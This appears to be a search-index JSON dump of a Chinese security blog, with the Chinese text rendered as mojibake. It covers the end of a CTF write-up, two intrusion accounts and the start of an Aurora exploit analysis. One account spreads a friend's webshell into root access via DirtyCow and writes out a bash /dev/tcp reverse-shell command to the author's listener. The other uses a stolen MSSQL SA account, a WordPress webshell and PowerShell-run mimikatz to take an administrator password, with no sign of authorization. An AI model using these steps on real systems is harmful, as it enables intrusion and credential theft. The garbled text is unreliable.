¼æ€»ç»“çš„å…³ç³»ï¼Œä»¥åŠCTFå·²ç»å…³é—­çš„ç¼˜æ•…ï¼Œæ²¡åŠæ³•éªŒè¯Flagæ˜¯å¦æ­£ç¡®ï¼Œå­—ç¬¦ä¸²ä¹Ÿå¯èƒ½æ˜¯Rc44c#1221222221212121211122112111#TCF#ã€‚æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š \" ","date":"2020-07-30","objectID":"/2020/07/one-ctf-reverse-writeup/:2:0","tags":["é€†å‘"],"title":"æŸCTFä¸€é“é€†å‘é¢˜åˆ†æ","uri":"/2020/07/one-ctf-reverse-writeup/"},{"categories":["CTF"],"content":"END ç¬¬ä¸€æ¬¡å†™ CTF é€†å‘é¢˜çš„WriteUpï¼Œå†™å¾—æ¯”è¾ƒå•°å—¦ï¼Œè€Œä¸”å¤ªä¹…æ²¡æé€†å‘äº†ï¼Œå¯èƒ½æœ‰äº›åœ°æ–¹åˆ†æå¾—ä¹Ÿä¸å¯¹ï¼Œå¦‚å‘ç°æœ‰ä»»ä½•é”™è¯¯ï¼Œæ¬¢è¿ä¸æˆ‘è”ç³»ã€‚ ç›¸å…³é“¾æ¥ ç›¸å…³æ–‡ä»¶ï¼šcpp.exe_WP.zip ","date":"2020-07-30","objectID":"/2020/07/one-ctf-reverse-writeup/:3:0","tags":["é€†å‘"],"title":"æŸCTFä¸€é“é€†å‘é¢˜åˆ†æ","uri":"/2020/07/one-ctf-reverse-writeup/"},{"categories":null,"content":"å…³äºåšå®¢ ä¸ªäººåšå®¢ï¼Œä½›ç³»æ›´æ–°ï¼Œæ¬¢è¿æ‰“æ‰° ","date":"2020-04-08","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":["æ‚ä¸ƒæ‚å…«"],"content":"This is my first hugo blog paper. ","date":"2020-04-08","objectID":"/2020/04/hello-hugo/:0:0","tags":[],"title":"Hello,Hugo","uri":"/2020/04/hello-hugo/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"ä¸€æ¬¡Linuxææƒçš„å®æˆ˜ç»å†","date":"2019-06-12","objectID":"/2019/06/dirtycow/","tags":["ææƒ","æ¸—é€ç»å†"],"title":"DirtyCow(è„ç‰›)æ¼æ´ä¹‹å®æˆ˜","uri":"/2019/06/dirtycow/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"1. å‰è¨€ è¿™ç¯‡æ–‡ç« æ˜¯å°ä¼™ä¼´æ‹¿ä¸‹äº†webshellï¼Œä½†å› ä¸ºæ˜¯LinuxæœåŠ¡å™¨ï¼Œä¸€ç›´æä¸äº†æƒï¼Œäºæ˜¯å«æˆ‘çœ‹çœ‹ã€‚æˆ‘é€šè¿‡DirtyCow(è„ç‰›)æ¼æ´æ‹¿åˆ°äº†ç®¡ç†å‘˜æƒé™ï¼Œç”±äºæ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦DirtyCow(è„ç‰›)æ¼æ´ï¼Œæ‰€ä»¥è®°å½•ä¸‹äº†è¿™ç¯‡æ–‡ç« ã€‚ ","date":"2019-06-12","objectID":"/2019/06/dirtycow/:1:0","tags":["ææƒ","æ¸—é€ç»å†"],"title":"DirtyCow(è„ç‰›)æ¼æ´ä¹‹å®æˆ˜","uri":"/2019/06/dirtycow/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"2. webshellæ‰§è¡Œå‘½ä»¤ é¦–å…ˆé€šè¿‡å·²æœ‰çš„å¤§é©¬webshellæ‰§è¡Œå‘½ä»¤ï¼Œå‘ç°æ‰§è¡Œå¤±è´¥ \" å†™ä¸ªä¸€å¥è¯æœ¨é©¬è¿›å»ï¼Œå†å°è¯•ç”¨èœåˆ€æ‰§è¡Œå‘½ä»¤ \" å¯ä»¥çœ‹åˆ°èœåˆ€ä¹Ÿä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯èœåˆ€è¿”å›äº†æœåŠ¡å™¨çš„å†…æ ¸ç‰ˆæœ¬å’Œç³»ç»Ÿä½æ•°ï¼Œæœç´¢äº†ä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯centos6.5ï¼Œæœ¬åœ°æ­å»ºcentos6.5æ˜¾ç¤ºçš„ä¿¡æ¯ä¹Ÿè¯æ˜äº†è¿™ä¸€ç‚¹ \" æœç´¢äº†èœåˆ€ä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œæ ¹æ®èµ„æ–™æ„é€ äº†ä¸€ä¸ªphpæ–‡ä»¶ï¼Œé€šè¿‡èœåˆ€ä¸Šä¼ äº†ä¸Šå»ï¼Œå‘ç°æœç„¶èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”ç³»ç»Ÿç‰ˆæœ¬çš„ç¡®æ˜¯centos6.5 \" é€šè¿‡webshellæŸ¥çœ‹å½“å‰æƒé™ï¼Œå‘ç°å½“å‰æƒé™ä¸ºwwwç”¨æˆ·çš„æƒé™ï¼Œå¾ˆå¤šå‘½ä»¤éƒ½ä¸èƒ½æ‰§è¡Œ \" ","date":"2019-06-12","objectID":"/2019/06/dirtycow/:2:0","tags":["ææƒ","æ¸—é€ç»å†"],"title":"DirtyCow(è„ç‰›)æ¼æ´ä¹‹å®æˆ˜","uri":"/2019/06/dirtycow/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"3. åå¼¹shell å› ä¸ºè„ç‰›æ¼æ´åˆ©ç”¨éœ€è¦ä¸€ä¸ªæŒç»­ä¿æŒè¿æ¥çš„shellï¼Œæ‰€ä»¥éœ€è¦åå¼¹ä¸€ä¸ªshell é¦–å…ˆåœ¨è‡ªå·±çš„å¤–ç½‘æœåŠ¡å™¨ç”¨ncç›‘å¬6666ç«¯å£ \" ç„¶ååœ¨webshellä¸Šæ‰§è¡Œåå¼¹shellå‘½ä»¤ \" $ bash -i \u003e\u0026 /dev/tcp/x.x.x.x/6666 0\u003e\u00261 # å…¶ä¸­x.x.x.xæ˜¯è‡ªå·±ncç›‘å¬çš„æœåŠ¡å™¨åœ°å€ æ‰§è¡Œå‘½ä»¤ä¹‹åï¼Œå¤–ç½‘æœåŠ¡å™¨è·å¾—ä¸€ä¸ªshell \" ","date":"2019-06-12","objectID":"/2019/06/dirtycow/:3:0","tags":["ææƒ","æ¸—é€ç»å†"],"title":"DirtyCow(è„ç‰›)æ¼æ´ä¹‹å®æˆ˜","uri":"/2019/06/dirtycow/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"4. ææƒ æœ‰äº†ç¨³å®šçš„shellä¹‹åï¼Œå°±å¯ä»¥å¼€å§‹å°è¯•ææƒäº†ï¼Œè¿™é‡Œææƒçš„expå»ºè®®åœ¨æœ¬åœ°ç¼–è¯‘ï¼Œå› ä¸ºç›®æ ‡æœºä¸Šwwwæƒé™å¯èƒ½æ²¡æƒé™æ‰§è¡Œgccå‘½ä»¤æˆ–è€…æ²¡æœ‰å®‰è£…gcc æœ¬åœ°ç¼–è¯‘æµ‹è¯• \" ä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨ä¸Šææƒ(éœ€è¦ä¸Šä¼ åˆ°/tmp/ç›®å½•ä¸‹ï¼Œå› ä¸º/tmp/ç›®å½•ä¸‹æœ‰æ‰§è¡Œæƒé™) \" ææƒæˆåŠŸåï¼Œé€šè¿‡firefartè´¦æˆ·ç™»å½•ï¼Œç„¶åæŸ¥çœ‹æƒé™å¯çœ‹åˆ°æ˜¯rootæƒé™ \" ","date":"2019-06-12","objectID":"/2019/06/dirtycow/:4:0","tags":["ææƒ","æ¸—é€ç»å†"],"title":"DirtyCow(è„ç‰›)æ¼æ´ä¹‹å®æˆ˜","uri":"/2019/06/dirtycow/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"5. END è¯¥ç¯‡æ–‡ç« æ²¡å•¥æŠ€æœ¯å«é‡ï¼Œå°±æ˜¯æ‹¿äººå®¶çš„expä¸Šå»è·‘äº†ä¸€éå°±ææƒæˆåŠŸäº†ï¼Œç›¸å½“äºè„šæœ¬å°å­äº†ï¼Œæ‰€ä»¥ä¸¥æ ¼æ¥è¯´è¿™åªæ˜¯ç¯‡ç»å†æ–‡ç« ã€‚æœ‰æ—¶é—´åº”è¯¥å»åˆ†æä¸‹è„ç‰›æ¼æ´çš„æ¼æ´æˆå› ï¼Œä»¥åå†è¯´å§ã€‚ å‚è€ƒé“¾æ¥ èœåˆ€ä¸èƒ½æ‰§è¡Œå‘½ä»¤è§£å†³æ–¹æ³•ï¼šhttps://www.webshell.cc/5328.html Linuxä¸‹åå¼¹SHELLçš„ç§ç§æ–¹å¼ï¼šhttps://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html åˆ©ç”¨è„ç‰›æ¼æ´è¯¦ç»†ææƒè¿‡ç¨‹ï¼šhttp://zone.secevery.com/article/846 ","date":"2019-06-12","objectID":"/2019/06/dirtycow/:5:0","tags":["ææƒ","æ¸—é€ç»å†"],"title":"DirtyCow(è„ç‰›)æ¼æ´ä¹‹å®æˆ˜","uri":"/2019/06/dirtycow/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"å¼ºå¤§çš„PowerShell","date":"2019-06-11","objectID":"/2019/06/powershell-get-passwd/","tags":["ææƒ","æ¸—é€ç»å†"],"title":"è®°ä¸€æ¬¡åˆ©ç”¨SQLè°ƒç”¨powershellå‘½ä»¤è·å–ç®¡ç†å‘˜å¯†ç ","uri":"/2019/06/powershell-get-passwd/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"1. å‰è¨€ è¿™ç¯‡æ–‡ç« æ˜¯æŠŠä»¥å‰å†™åœ¨wordæ–‡æ¡£ä¸­çš„å†…å®¹æ¬è¿‡æ¥äº†ï¼Œä¸»è¦å†…å®¹å°±æ˜¯è®°å½•äº†ä¸€æ¬¡ææƒè¿‡ç¨‹ï¼Œé€šè¿‡MSSQLæƒé™è°ƒç”¨PowerShellå¹¶æ‰§è¡Œå‘½ä»¤ï¼Œæœ€ç»ˆè·å–äº†ç®¡ç†å‘˜çš„å¯†ç ã€‚è™½ç„¶æœ€åæ€»ç»“çš„æµç¨‹å¾ˆç®€å•ï¼Œä½†ä¸­é—´è¸©è¿‡çš„å‘ã€é‡åˆ°çš„é—®é¢˜å¯æ˜¯ä¸è®¡å…¶æ•°(è‡ªå·±æ¯”è¾ƒèœ)ï¼Œæ‰€ä»¥å°†æ­¤è¿‡ç¨‹åšäº†ä¸€ä¸ªè®°å½•ã€‚ ","date":"2019-06-11","objectID":"/2019/06/powershell-get-passwd/:1:0","tags":["ææƒ","æ¸—é€ç»å†"],"title":"è®°ä¸€æ¬¡åˆ©ç”¨SQLè°ƒç”¨powershellå‘½ä»¤è·å–ç®¡ç†å‘˜å¯†ç ","uri":"/2019/06/powershell-get-passwd/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"2. åˆè¯•ææƒ é¦–å…ˆï¼Œå·²ç»å¾—åˆ°äº†æŸä¸ªæœåŠ¡å™¨çš„IPå’ŒMSSQLçš„SAè´¦æˆ·å’Œå¯†ç ï¼Œå¾ˆé«˜å…´çš„è¿ä¸Šå»ï¼Œå¿ƒæƒ³SAè´¦æˆ·éƒ½æœ‰äº†ï¼Œæä¸ªæƒè¿˜ä¸æ˜¯åˆ†åˆ†é’Ÿçš„äº‹ \" ç™»è·¯ä¸Šå»ä¹‹åé©¬ä¸Šå°è¯•è°ƒç”¨xp_cmdshellï¼Œçœ‹ç®¡ç†å‘˜æ˜¯å¦ç¦ç”¨äº†xp_cmdshell \" è™½ç„¶æŠ¥äº†ä¸€ä¸ªé”™è¯¯(ä¸æ¸…æ¥šæ˜¯ä»€ä¹ˆé”™è¯¯)ï¼Œä½†æ˜¯è¿˜å¥½æ²¡æœ‰è¢«ç¦ç”¨ï¼Œè€Œä¸”è¿˜æ˜¯systemæƒé™ï¼Œçœ‹æ¥ææƒè§¦æ‰‹å¯å¾—ï¼Œé©¬ä¸Šä½¿ç”¨net useråˆ›å»ºç”¨æˆ· \" what xxxx! ä»€ä¹ˆæƒ…å†µï¼Œå±…ç„¶æ²¡æ‰§è¡ŒæˆåŠŸï¼Œæ€€ç–‘ç®¡ç†å‘˜æŠŠxp_cmdshellåšäº†ä»€ä¹ˆæ‰‹è„šï¼Œäºæ˜¯å»ç™¾åº¦äº†è®¸å¤šä¸åˆ©ç”¨xp_cmdshellæ¥æ‰§è¡Œå‘½ä»¤çš„sqlè¯­å¥ \" ä½†æ˜¯å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ï¼Œæ— ä¸€ä¾‹å¤–éƒ½å¤±è´¥äº†ï¼Œåªèƒ½å¦æƒ³åŠæ³•äº†ï¼Œç„¶åå‘ç°å¯ä»¥æ‰§è¡Œsysteminfoå‘½ä»¤ï¼Œæ˜¾ç¤ºæ˜¯win2008 \" Nmapæ‰«æäº†ä¸€ä¸‹ç«¯å£ï¼Œ445æ˜¯å¼€å¯çš„ï¼Œåˆšå¥½è¿™å‡ å¤©å­¦ä¼šäº†ms17-010çš„æ¼æ´ï¼Œå°±æ‰“ç®—ç”¨msfç›´æ¥è·å–åˆ°shellï¼Œä½†æ˜¯æƒ³è±¡éƒ½æ˜¯ç¾å¥½çš„ï¼Œè¿™æœåŠ¡å™¨å¥½åƒæ‰“äº†è¡¥ä¸ï¼Œè€Œä¸”è‡ªå·±æ²¡æœ‰å…¬ç½‘åœ°å€ï¼Œå¯¼è‡´åå¼¹ä¸å›æ¥shell \" ","date":"2019-06-11","objectID":"/2019/06/powershell-get-passwd/:2:0","tags":["ææƒ","æ¸—é€ç»å†"],"title":"è®°ä¸€æ¬¡åˆ©ç”¨SQLè°ƒç”¨powershellå‘½ä»¤è·å–ç®¡ç†å‘˜å¯†ç ","uri":"/2019/06/powershell-get-passwd/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"3. å±±ç©·æ°´å°½ç–‘æ— è·¯ ç»è¿‡ä¸Šé¢çš„æµ‹è¯•ï¼Œæˆ‘æ„è¯†åˆ°äº‹æƒ…å¹¶æ²¡æœ‰é‚£ä¹ˆç®€å•ã€‚è¿™å°æœåŠ¡å™¨ä¸çŸ¥é“åšäº†å•¥æ‰‹è„šï¼ŒCMDå‘½ä»¤åªèƒ½æ‰§è¡Œä¸€éƒ¨åˆ†æ²¡æœ‰å•¥å±å®³çš„å‘½ä»¤ï¼Œæ‰§è¡Œåˆ›å»ºç”¨æˆ·è¿™ç§å‘½ä»¤å°±ç›´æ¥æŠ¥é”™ã€‚éœ€è¦æ¢ä¸€æ¢æ€è·¯ææã€‚ åˆšæ‰ä½¿ç”¨Nmapæ‰«æäº†ä¸€ä¸‹ç«¯å£ï¼Œè§‚å¯Ÿäº†ä¸€ä¸‹å¼€å¯çš„ç«¯å£ï¼Œå…¶ä¸­åŒ…æ‹¬å¾ˆå¤šä¸ªIISçš„httpç«¯å£ \" è¿›äº†ä¸€ä¸ªç½‘ç«™çœ‹äº†çœ‹ï¼Œå‘ç°æ˜¯éœ€è¦ç™»å½•çš„ \" ä»æ•°æ®åº“é‡Œæ‰¾åˆ°adminçš„å¯†ç ï¼Œå¿ƒæƒ³èƒ½ä¸èƒ½ä»ç½‘ç«™è·å–ä¸€ä¸ªshellï¼Œè¿›å»çœ‹äº†ä¹‹åæˆ‘æ”¾å¼ƒäº†ï¼Œå…¨æ˜¯è‹±æ–‡ï¼Œçœ‹ç€å¤´ç–¼ \" çœ‹äº†ä¸€ä¸‹å…¶ä½™çš„ç½‘ç«™ï¼Œå…¨æ˜¯aspxçš„ï¼Œè€Œä¸”éƒ½æ˜¯è‹±æ–‡ç«™ï¼Œè®©æˆ‘æ”¾å¼ƒäº†ä»ç½‘ç«™å…¥æ‰‹çš„æƒ³æ³•ã€‚ç»§ç»­ç¿»ç€ç«¯å£åˆ—è¡¨ï¼Œçªç„¶çœ‹åˆ°ä¸€ä¸ªApacheæœåŠ¡ \" å¿ƒé‡Œå¾ˆç–‘æƒ‘ï¼Œè¿™ä¸ªæœåŠ¡å™¨ä¸æ˜¯å¸ƒç½®çš„IISå—ï¼Œæ€ä¹ˆApacheä¹Ÿåœ¨ä¸Šé¢ï¼Œè®¿é—®ä¸€ä¸‹è¿™ä¸ªç«¯å£è¯•è¯• \" å§æ§½ï¼Œå±…ç„¶æ˜¯wampåˆšæ­å»ºå¥½çš„é¡µé¢ï¼Œéš¾é“è¿æ°”è¿™ä¹ˆå¥½ï¼Œåˆèƒ½ç™»å½•MySQLäº†ï¼Ÿ \" æœç„¶äº‹ä¸å¦‚æ„¿ï¼Œå±…ç„¶è®¿é—®ä¸äº†ï¼Œçœ‹æ¥è¿˜æ˜¯ä¸è¡Œå•Šï¼Œåˆå›å»çœ‹äº†çœ‹MSSQLæ•°æ®åº“ï¼Œå‘ç°dirå‘½ä»¤å¯ä»¥æ‰§è¡Œï¼Œé€šè¿‡dirå‘½ä»¤ï¼Œå‘ç°äº†wampç›®å½•ä¸‹çš„WordPressï¼Œå°è¯•adminç™»å½•ï¼Œç«Ÿç„¶ç™»å½•è¿›å»äº† \" ç„¶åç™¾åº¦äº†ä¸€ä¸‹WordPressæ‹¿shellï¼Œåˆ©ç”¨ä¿®æ”¹æ–‡ä»¶å†…å®¹å†™è¿›ä¸€å¥è¯æœ¨é©¬ \" ç”¨èœåˆ€è¿æ¥ï¼Œæœç„¶èƒ½è¿æ¥ä¸Šäº†(ä¸çŸ¥é“shellè·¯å¾„å°±è‡ªå·±æœ¬åœ°æ­å»ºä¸€ä¸ªWordPressæµ‹è¯•) \" å°è¯•ç”¨cmdåˆ›å»ºç”¨æˆ·è¯•è¯• \" è¿˜æ˜¯ä¸€æ ·æ— æ³•åˆ›å»ºï¼Œå¯èƒ½å°±æ˜¯å› ä¸ºç®¡ç†å‘˜æŠŠnetå‘½ä»¤ç»™ç¦ç”¨äº†æˆ–è€…ç»™æ›´æ”¹äº†ä»€ä¹ˆçš„ï¼Œåæ­£é€šè¿‡åˆ›å»ºç”¨æˆ·è¿™ä¸€æ¡è·¯æ˜¯ä¸å¯èƒ½çš„äº†ï¼Œåªæœ‰ç›´æ¥è¯»å–Administratorçš„å¯†ç æ‰è¡Œï¼Œä¸Šä¼ getpass64.exeä¸Šå»æ‰§è¡Œï¼Œæ˜¾ç¤ºè¶…æ—¶ \" ç„¶åæƒ³èµ·æ˜¯2008çš„ç³»ç»Ÿï¼Œpowershellåº”è¯¥èƒ½ç”¨ï¼Œå°è¯•äº†ä¸€ä¸‹ \" æœç„¶èƒ½ç”¨ï¼Œç„¶åå°±æƒ³èƒ½ä¸èƒ½ä½¿ç”¨powershellåå¼¹shellæ¥è·å–ä¸€ä¸ªæƒé™ \" ä½†æ˜¯å¥½åƒæ˜¯æ²¡å…¬ç½‘IPçš„ç¼˜æ•…ï¼Œä¹Ÿå¤±è´¥äº†ï¼Œä¸€ç›´æ”¶ä¸åˆ°åå¼¹çš„shell \" ","date":"2019-06-11","objectID":"/2019/06/powershell-get-passwd/:3:0","tags":["ææƒ","æ¸—é€ç»å†"],"title":"è®°ä¸€æ¬¡åˆ©ç”¨SQLè°ƒç”¨powershellå‘½ä»¤è·å–ç®¡ç†å‘˜å¯†ç ","uri":"/2019/06/powershell-get-passwd/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"4. æŸ³æš—èŠ±æ˜åˆä¸€æ‘ åˆ°è¿™é‡Œå°±å¾ˆéš¾å—äº†ï¼Œæˆ‘æ„Ÿè§‰èƒ½åˆ©ç”¨çš„éƒ½åˆ©ç”¨äº†ï¼Œèƒ½è¯•çš„æ–¹æ³•éƒ½è¯•äº†ï¼Œä½†éƒ½æä¸ä¸‹æ¥ã€‚éš¾é“å°±è¦æ”¾å¼ƒäº†ä¹ˆï¼Œå¯è¿‘åœ¨å’«å°ºçš„èƒœåˆ©ä»¥åŠèŠ±è´¹çš„æ—¶é—´è®©æˆ‘æ”¾å¼ƒæ„Ÿåˆ°å¾ˆåƒäºï¼Œé‚£å°±ç»§ç»­æå‘—ã€‚ ç»è¿‡é»‘æ— å¸¸å¤§ä½¬çš„æé†’ï¼Œå¯ä»¥åˆ©ç”¨msfè°ƒç”¨mimikatzæ¥è¯»å–å¯†ç  \" ä½†æ˜¯æˆ‘msfåå¼¹ä¸å›shellå•Šï¼Œè¿™ä¸ªæ–¹æ³•æœ‰ä¸ªå±ç”¨å•Šï¼Œç™½é«˜å…´ä¸€åœºäº† \" ç„¶åä¸€ç›´åœ¨ç½‘ä¸Šå¯»æ‰¾å…¶ä»–æ–¹æ³•ï¼Œæ‰¾åˆ°äº†å¯åˆ©ç”¨powershellè°ƒç”¨mimikatzæ¥è¯»å–å¯†ç  \" ç„¶åå°è¯•åœ¨æœ¬åœ°æ‰§è¡Œï¼Œæœ¬åœ°æ‰§è¡Œéƒ½å¤±è´¥äº†ï¼Œè¿™å°±å¾ˆå°´å°¬äº† \" ç„¶ååˆç ”ç©¶è¿™ä¸ªåŸç†ï¼Œç»ˆäºçŸ¥é“äº†æœ¬åœ°ä¸ºä»€ä¹ˆä¼šå¤±è´¥ï¼Œè¿™ä¸ªpowershellå‘½ä»¤æ˜¯åœ¨ç½‘ä¸Šä¸‹è½½powershellè„šæœ¬ï¼Œç„¶åå†æ‰§è¡Œï¼Œå¤±è´¥çš„åŸå› ä¸‹è½½é“¾æ¥ä¸å¯¹ï¼Œæ‰€ä»¥å¯¼è‡´å¤±è´¥ï¼Œç„¶åæ‰¾åˆ°äº†GitHubä¸Šçš„è„šæœ¬ï¼Œå†å»æœ¬åœ°æ‰§è¡Œï¼Œæœç„¶æ‰§è¡ŒæˆåŠŸäº† \" ç„¶åæ”¾åœ¨èœåˆ€é‡Œæ‰§è¡Œï¼Œç„¶åå¼€å§‹å‡ æ¬¡åé¢æ‰§è¡Œè¶…æ—¶ï¼Œåé¢æ‰§è¡Œæ—¶æŠ¥äº†å¦‚ä¸‹é”™è¯¯ï¼Œå¤§æ¦‚æ˜¯å› ä¸ºç½‘é€Ÿå¤ªæ…¢æˆ–è€…èœåˆ€æ‰§è¡Œå‘½ä»¤ä¸å’Œcmdä¸€æ ·ï¼Œå…·ä½“ä¸ºä»€ä¹ˆä¸å¤ªæ¸…æ¥š \" ç„¶ååˆæƒ³åˆ°äº†MSSQL(ä¸ºä»€ä¹ˆæ€»èƒ½æƒ³åˆ°å®ƒå•Šï¼Œå¤§æ¦‚æ˜¯å› ä¸ºé¦–å…ˆæ‹¿åˆ°æƒé™å°±æ˜¯å› ä¸ºå®ƒå§å“ˆå“ˆå“ˆ)ï¼Œæ‰§è¡Œpowershellå‘½ä»¤è¯•è¯• \" æœç„¶å¯ä»¥æ‰§è¡Œï¼Œç„¶åæŠŠåˆšæ‰é‚£æ®µåœ¨æœ¬åœ°æ‰§è¡Œçš„powershellå‘½ä»¤å¸¦è¿›å»æ‰§è¡Œ(å› ä¸ºæœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œéœ€è¦ä½¿ç”¨è½¬ä¹‰å­—ç¬¦) \" å“‡ï¼Œç»ˆäºæˆåŠŸäº†ï¼Œç”¨äº†ä¸‰å¤©æ—¶é—´ç»ˆäºæ‹¿ä¸‹æ¥äº†ï¼ŒçœŸæ˜¯ä¸å®¹æ˜“ï¼Œè¿™æ¬¡ææƒå°±ç®—å‘Šä¸€æ®µè½äº† \" ","date":"2019-06-11","objectID":"/2019/06/powershell-get-passwd/:4:0","tags":["ææƒ","æ¸—é€ç»å†"],"title":"è®°ä¸€æ¬¡åˆ©ç”¨SQLè°ƒç”¨powershellå‘½ä»¤è·å–ç®¡ç†å‘˜å¯†ç ","uri":"/2019/06/powershell-get-passwd/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"5. END è¿™æ¬¡ææƒç®—æ˜¯å­¦åˆ°äº†ä¸å°‘ä¸œè¥¿ï¼Œæ¯”å¦‚MSSQLä¸åªæœ‰xp_cmdshellå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè¿˜æœ‰å¾ˆå¤šè¯­å¥éƒ½èƒ½æ‰§è¡Œã€‚è¿˜æœ‰powershellåå¼¹shellã€powershellä¸‹è½½è„šæœ¬æ‰§è¡Œç­‰ç­‰æŠ€æœ¯ã€‚æœ€é‡è¦çš„æ˜¯å­¦åˆ°äº†ä¸€äº›é“ç†ï¼š ä¸æŠ›å¼ƒä¸æ”¾å¼ƒè¿™å¥è¯ä¸åªæ˜¯CFçš„å®£è¨€ï¼Œåœ¨ç°å®ä¸­ä¹Ÿæ˜¯å¾ˆå¥½çš„é“ç† éªšæ€è·¯ä¸€å®šè¦å¤šï¼Œä¸èƒ½åœ¨ä¸€ä¸ªåœ°æ–¹åŠæ­» ä¿¡æ¯ 2020.05æœˆæ›´æ–°ï¼š è¯¥æ–‡ç« çš„å†™ä½œæ—¶é—´çœ‹ä¸Šå»æ˜¯19å¹´ï¼Œå®é™…æ—¶é—´å…¶å®æ›´æ—©ã€‚ä»æŠ€æœ¯æ°´å¹³ã€å†™ä½œæ°´å¹³ä¸Šæ¥è¯´ï¼Œçš„ç¡®æ˜¯ç¨æ˜¾ç¨šå«©ã€‚ä½†è¿™ç¯‡æ–‡ç« åº”è¯¥æ˜¯æˆ‘å…¥å®‰å…¨åœˆä»¥æ¥ç¬¬ä¸€ç¯‡æ–‡ç« ï¼Œæ‰€ä»¥ä¸€ç›´ä¿å­˜åˆ°ç°åœ¨ï¼Œé‡Œé¢å¾ˆå¤šè¯è¯­ä¸æ­£ç¡®çš„åœ°æ–¹ä¹Ÿæ²¡æœ‰å»æ”¹ï¼Œå½“ç•™ä½œçºªå¿µå§ï¼Œæœ›è¯»åˆ°è¯¥ç¯‡æ–‡ç« çš„å¤§ä½¬ä»¬è½»å–·ã€‚ ","date":"2019-06-11","objectID":"/2019/06/powershell-get-passwd/:5:0","tags":["ææƒ","æ¸—é€ç»å†"],"title":"è®°ä¸€æ¬¡åˆ©ç”¨SQLè°ƒç”¨powershellå‘½ä»¤è·å–ç®¡ç†å‘˜å¯†ç ","uri":"/2019/06/powershell-get-passwd/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"æå…‰è¡ŒåŠ¨ï¼ŒAuroraï¼ŒæŠ›å¼€æ•æ„Ÿçš„å› ç´ å¤–ï¼Œå…¶æŠ€æœ¯æ‰‹æ®µå€¼å¾—è§‚æ‘©ï¼Œæ¬£èµé¡¶çº§é»‘å®¢çš„è¾ƒé‡å§ã€‚","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":" æ–‡ç« é“¾æ¥ æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ 1ï¼šæå–æ ·æœ¬ æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ 2ï¼šæ¼æ´æˆå› åˆ†æ ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:0:0","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"1. å‰è¨€ ä¸Šä¸€ç¯‡æ–‡ç« å¯¹æµé‡åŒ…è¿›è¡Œäº†åˆ†æï¼Œæå–å‡ºäº†æ”»å‡»æ ·æœ¬ï¼Œè¿™æ¬¡æ¥ç€å¯¹æ¼æ´æˆå› è¿›è¡Œä¸€æ¬¡è¯¦ç»†åˆ†æã€‚ ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:1:0","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2. æ¼æ´è¯¦ç»†åˆ†æ ","date":"2019-06-10","objectID":"/2019/06/aurora-analysis-2/:2:0","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æ¼æ´æˆå› åˆ†æ","uri":"/2019/06/aurora-analysis-2/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.1 æŸ¥çœ‹å´©æºƒä¿¡æ¯ é¦–å…ˆè®¿é—®æå–çš„æ”»å‡»æ ·æœ¬ï¼Œä½¿IEå´©æºƒï¼š IEå´©æºƒ\" IEå´©æºƒ ä»å´©æºƒä¿¡æ¯æ¥çœ‹ï¼Œå´©æºƒä½ç½®åœ¨mshtml.dllæ¨¡å—ä¸­åç§»0x68C83çš„ä½ç½® æ³¨æ„ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¯¥æ¼æ´æ˜¯ä¸€ä¸ªUAFæ¼æ´ï¼Œåœ¨ç©ºé—´è¢«é‡Šæ”¾åï¼Œé‚£ä¸€ç‰‡åŒºåŸŸçš„å†…å­˜ç©ºé—´å¯ä»¥è¢«ä»»æ„ä½¿ç”¨çš„ï¼Œè€Œå 